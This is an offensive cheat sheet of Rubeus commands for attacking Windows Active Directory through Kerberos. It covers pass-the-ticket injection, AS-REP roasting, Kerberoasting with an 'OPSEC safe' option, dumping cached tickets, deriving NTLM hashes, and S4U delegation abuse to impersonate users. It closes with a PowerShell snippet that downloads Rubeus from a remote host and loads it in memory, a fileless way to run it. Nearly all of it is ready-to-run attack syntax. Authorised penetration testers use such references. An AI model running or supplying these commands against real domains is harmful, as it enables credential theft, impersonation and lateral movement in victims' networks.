# rubeus

% ad, windows, rubeus

## Rubeus - Inject Ticket from File
Injects a Kerberos ticket from a .kirbi file into the current session.
#plateform/windows #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<ticket_file_path>
```

## Rubeus - Load from PowerShell (Local)
Loads Rubeus from a local executable into PowerShell memory.
#plateform/windows #target/local #cat/UTILS 
```powershell
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\Path\To\Rubeus.exe"))
```

## Rubeus - Execute from PowerShell
Executes a Rubeus command directly from PowerShell after loading the assembly.
#plateform/windows #target/remote #cat/UTILS 
```powershell
[Rubeus.Program]::MainString("klist");
```

## Rubeus - Monitor Kerberos Activity
Monitors for Kerberos activity, filtering by user.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe monitor /interval:5 /filteruser:<machine_account>
```

## Rubeus - Inject Ticket from Base64 Blob
Injects a Kerberos ticket from a Base64 encoded blob.
#plateform/windows #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<BASE64BLOBHERE>
```

## Rubeus - AS-REP Roasting (All Users)
Checks for AS-REP Roasting vulnerability for all users in the current domain.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast /format:<AS_REP_response_format> /outfile:<output_hashes_file>
```

## Rubeus - AS-REP Roasting (Specific User)
Performs AS-REP Roasting for a specific user.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
```

## Rubeus - Kerberoasting (Current Domain)
Performs Kerberoasting for service principal names (SPNs) in the current domain.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

## Rubeus - Kerberoasting (Specific Domain)
Performs Kerberoasting for SPNs in a specific domain.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
```

## Rubeus - Kerberoasting (OPSEC Safe - RC4)
Performs Kerberoasting while avoiding AES-enabled accounts for OPSEC.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
```

## Rubeus - Kerberoast AES Enabled Accounts
Performs Kerberoasting specifically targeting AES-enabled accounts.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes
```
 
## Rubeus - Kerberoast Specific User Account
Performs Kerberoasting for a specific user account.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple
```

## Rubeus - Get User Hash
Retrieves the NTLM hash for a specified user.
#plateform/windows #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```cmd
.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>
```

## Rubeus - Dump Cached Tickets
Dumps any relevant cached TGS tickets stored in the current session.
#plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe dump
```

## Rubeus - Ask and Inject Ticket
Requests a TGT for a user and injects it into the current session.
#plateform/windows #target/remote #cat/ATTACK/CONNECT 
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
```

## Rubeus - S4U with Ticket (Constrained Delegation)
Performs S4U with a ticket for constrained delegation.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
```

## Rubeus - S4U with Hash (Constrained Delegation)
Performs S4U with an NTLM hash for constrained delegation.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
```

## Rubeus - Get RC4 Hash of Machine Account
Retrieves the RC4 hash of a machine account's password.
#plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe hash /password:<machine_password>
```

## Rubeus - S4U (Resource-Based Constrained Delegation)
Performs S4U for resource-based constrained delegation.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
```

## Rubeus - Load and Execute via Reflection (PowerShell)
Loads and executes Rubeus commands in PowerShell using reflection.
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("<rubeus_cmd>".Split())
```

= ticket : c:\Temp\ticket.kirbi
= domain_fqdn : MYDC.mydomain.local
= domain_name : mydomain.local
= AS_REP_response_format : hashcat